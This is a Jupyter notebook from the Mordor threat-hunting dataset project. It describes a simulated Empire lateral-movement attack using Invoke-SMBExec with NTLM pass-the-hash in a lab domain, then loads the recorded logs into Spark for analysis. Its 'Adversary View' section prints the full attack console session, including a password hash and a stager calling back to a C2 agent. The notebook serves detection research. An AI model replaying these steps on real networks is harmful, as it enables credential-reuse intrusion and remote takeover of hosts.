{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Invoke Smbexec"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518210125 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/lateral_movement/Invoke-SMBExec.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_smbexec.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries performing SMBExec style command execution with NTLMv2 pass the hash authentication."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: TKV35P8X) > usemodule lateral_movement/invoke_smbexec\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > info\n",
    "\n",
    "              Name: Invoke-SMBExec\n",
    "            Module: powershell/lateral_movement/invoke_smbexec\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @rvrsh3ll\n",
    "\n",
    "Description:\n",
    "  Executes a stager on remote hosts using SMBExec.ps1\n",
    "\n",
    "Comments:\n",
    "  https://raw.githubusercontent.com/Kevin-Robertson/Invoke-\n",
    "  TheHash/master/Invoke-SMBExec.ps1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name         Required    Value                     Description\n",
    "  ----         --------    -------                   -----------\n",
    "  CredID       False                                 CredID from the store to use.           \n",
    "  ComputerName True                                  Host[s] to execute the stager on, comma \n",
    "                                                    separated.                              \n",
    "  Service      False                                 Name of service to create and delete.   \n",
    "                                                    Defaults to 20 char random.             \n",
    "  ProxyCreds   False       default                   Proxy credentials                       \n",
    "                                                    ([domain\\]username:password) to use for \n",
    "                                                    request (default, none, or other).      \n",
    "  Username     True                                  Username.                               \n",
    "  Domain       False                                 Domain.                                 \n",
    "  Hash         True                                  NTLM Hash in LM:NTLM or NTLM format.    \n",
    "  Agent        True        TKV35P8X                  Agent to run module on.                 \n",
    "  Listener     True                                  Listener to use.                        \n",
    "  Proxy        False       default                   Proxy to use for request (default, none,\n",
    "                                                    or other).                              \n",
    "  UserAgent    False       default                   User-agent string to use for the staging\n",
    "                                                    request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set Username pgustavo\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain shire\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash 8ece039f32592670b45fc801e2a9157d\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName IT001.shire.com\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > execute\n",
    "[*] Tasked TKV35P8X to run TASK_CMD_WAIT\n",
    "[*] Agent TKV35P8X tasked with task ID 27\n",
    "[*] Tasked agent TKV35P8X to run module powershell/lateral_movement/invoke_smbexec\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > Command executed with service PWXYXULFULYYGFYDYBIF on IT001.shire.com\n",
    "\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103\n",
    "[*] New agent XSZ91N7T checked in\n",
    "[+] Initial agent XSZ91N7T from 10.0.10.103 now active (Slack)\n",
    "[*] Sending agent (stage 2) to XSZ91N7T at 10.0.10.103\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "H3DKB8SA ps 172.18.39.106   HR001             SHIRE\\nmartha           powershell         5172   5/0.0    2019-05-18 21:02:06  https           \n",
    "TKV35P8X ps 172.18.39.106   HR001             *SHIRE\\nmartha          powershell         5452   5/0.0    2019-05-18 21:02:09  https           \n",
    "EMDBFPSY ps 172.18.39.106   HR001             SHIRE\\nmartha           notepad            7924   5/0.0    2019-05-18 21:02:08  https           \n",
    "\n",
    "V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\\pgustavo          powershell         5204   5/0.0    2019-05-18 21:02:10  https           \n",
    "XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:02:08  https           \n",
    "\n",
    "(Empire: agents) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_smbexec.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
